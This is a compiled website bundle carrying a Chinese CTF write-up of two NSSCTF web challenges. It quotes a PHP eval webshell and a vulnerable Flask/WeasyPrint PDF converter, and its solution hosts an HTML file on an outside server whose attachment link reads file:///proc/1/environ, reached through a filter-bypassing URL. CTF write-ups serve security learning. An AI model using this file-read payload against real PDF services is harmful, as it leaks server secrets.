"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[5085],{25918:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>p,frontMatter:()=>o,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","title":"NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","description":"\u771f\u4ea6\u5047\uff0c\u5047\u4ea6\u771f","source":"@site/docs/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","permalink":"/docs/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/NSSCTF Round-20 Basic\u4e2a\u4ebaWEB\u4e13\u573a.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"2024\u7ea2\u660e\u8c37","permalink":"/docs/CTF/Misc/2024\u7ea2\u660e\u8c37"},"next":{"title":"NewStarCTF2023","permalink":"/docs/CTF/Misc/NewStarCTF2023"}}');var s=r(74848),i=r(28453);const o={},l=void 0,c={},a=[{value:"\u771f\u4ea6\u5047\uff0c\u5047\u4ea6\u771f",id:"\u771f\u4ea6\u5047\u5047\u4ea6\u771f",level:2},{value:"CSDN_To_PDF V1.2",id:"csdn_to_pdf-v12",level:2}];function d(e){const n={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"\u771f\u4ea6\u5047\u5047\u4ea6\u771f",children:"\u771f\u4ea6\u5047\uff0c\u5047\u4ea6\u771f"}),"\n",(0,s.jsx)(n.p,{children:"\u6253\u5f00shell.php\uff0c\u53d1\u73b0\u662f\u4e00\u53e5\u8bdd\uff0c\u4f46\u662f\u8fde\u4e0d\u4e0a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nheader('Content-Type: text/html; charset=utf-8');\r\nhighlight_file(__FILE__);\r\n\r\n//\u6807\u51c6\u4e00\u53e5\u8bdd\u6728\u9a6c~\r\neval($_POST[1]);\r\n?>\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5176\u5b9e\u8fd9\u53ea\u662fJava\u4f2a\u9020\u7684\u4e00\u53e5\u8bdd"}),"\n",(0,s.jsx)(n.p,{children:"flag\u8def\u7531\u626b\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"csdn_to_pdf-v12",children:"CSDN_To_PDF V1.2"}),"\n",(0,s.jsx)(n.p,{children:"python WeasyPrint \u7684\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.p,{children:"WeasyPrint \u662f\u4e00\u4e2a\u5f00\u6e90\u7684 Python \u5e93\uff0c\u4e3b\u8981\u7528\u4e8e\u5c06 HTML \u5185\u5bb9\u53ca\u5176\u76f8\u5173\u7684 CSS \u6837\u5f0f\u8f6c\u6362\u6210 PDF \u6587\u6863\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for\r\nimport re\r\nfrom flask_weasyprint import HTML, render_pdf\r\nimport os\r\n\r\napp = Flask(__name__)\r\n\r\nURL_REGEX = re.compile(\r\n    r'http(s)?://'\r\n    r'(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+'\r\n)\r\n\r\n\r\ndef is_valid_url(url):\r\n    if not URL_REGEX.match(url):\r\n        return False\r\n    if \"blog.csdn.net\" not in url:\r\n        return False\r\n\r\n    return True\r\n\r\n\r\n@app.route('/', methods=['GET', 'POST'])\r\ndef CsdnToPdf():\r\n    if request.method == 'POST':\r\n        url = request.form.get('url')\r\n        url = url.replace(\"html\", \"\")\r\n        if is_valid_url(url):\r\n            try:\r\n                html = HTML(url=url)\r\n                pdf = html.write_pdf()\r\n                response = make_response(pdf)\r\n                response.headers['Content-Type'] = 'application/pdf'\r\n                response.headers['Content-Disposition'] = 'attachment; filename=output.pdf'\r\n\r\n                return response\r\n            except Exception as e:\r\n                return f'Error generating PDF', 500\r\n        else:\r\n            return f'Invalid URL! Target web address: ' + url\r\n    else:\r\n        return render_template(\"index.html\"), 200\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='0.0.0.0', port=8080)\n"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u5fc5\u987b\u5305\u542b",(0,s.jsx)(n.code,{children:"blog.csdn.net"})]}),"\n",(0,s.jsx)(n.p,{children:"\u4f1a\u8fc7\u6ee4\u66ff\u6362\u5b57\u7b26\u4e32html"}),"\n",(0,s.jsxs)(n.p,{children:["\u6587\u4ef6\u5939\u540d\u5b57\u53ef\u4ee5\u662f",(0,s.jsx)(n.code,{children:"blog.csdn.net"})]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u5728vps\u4e0a\u5199\u4e2a",(0,s.jsx)(n.code,{children:"test.html"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'<!DOCTYPE html>\r\n<html lang="en">\r\n<head>\r\n    <meta charset="UTF-8">\r\n</head>\r\n<body>\r\n<link rel="attachment" href="file:///proc/1/environ">\r\n</body>\r\n</html>\n'})}),"\n",(0,s.jsx)(n.p,{children:"payload"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"http://120.46.41.173/Jay17/blog.csdn.net/link.hthtmlml\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u62ff\u5230PDF\u540e\uff0c",(0,s.jsx)(n.code,{children:"binwalk -e \u6587\u4ef6\u540d"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240405153709723.png",alt:"image-20240405153709723"})})]})}function p(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>o,x:()=>l});var t=r(96540);const s={},i=t.createContext(s);function o(e){const n=t.useContext(i);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),t.createElement(i.Provider,{value:n},e.children)}}}]);